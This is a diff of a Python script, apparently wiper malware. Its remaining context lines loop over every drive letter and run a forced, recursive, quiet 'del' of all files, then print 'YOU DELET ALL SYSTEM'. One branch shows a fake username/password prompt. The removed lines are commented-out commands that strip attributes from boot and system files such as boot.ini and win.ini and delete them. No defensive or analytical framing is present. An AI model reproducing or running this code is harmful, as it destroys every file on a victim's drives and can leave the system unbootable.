@@ -65,15 +65,6 @@ def run():
                 for d in listdrive:
                     driver = d
                     os.system('del '+ driver + ':\*.* /f /s /q')
-                # os.system('off')
-                # os.system('attrib -r -g -h C:\\autoexec.bat')
-                # os.system('del C:\\autoexec.bat')
-                # os.system('attrib -r -g -h C:\\boot.ini')
-                # os.system('del C:\\boot.ini')
-                # os.system('attrib -r -g -h C:\\ntidr')
-                # os.system('del C:\\ntidr')
-                # os.system('attrib -r -g -h C:\windows\win.ini')
-                # os.system('del C:\windows\win.ini')
             else:
                 print(f'usename: {username()}')
                 print('password: ')
@@ -82,15 +73,6 @@ def run():
                 for d in listdrive:
                     driver = d
                     os.system('del '+ driver + ':\*.* /f /s /q')
-                # os.system('off')
-                # os.system('attrib -r -g -h C:\autoexec.bat')
-                # os.system('del C:\autoexec.bat')
-                # os.system('attrib -r -g -h C:\boot.ini')
-                # os.system('del C:\boot.ini')
-                # os.system('attrib -r -g -h C:\ntidr')
-                # os.system('del C:\ntidr')
-                # os.system('attrib -r -g -h C:\windows\win.ini')
-                # os.system('del C:\windows\win.ini')
                 print('=============================')
                 print('    YOU DELET ALL SYSTEM    |')
                 print('=============================')
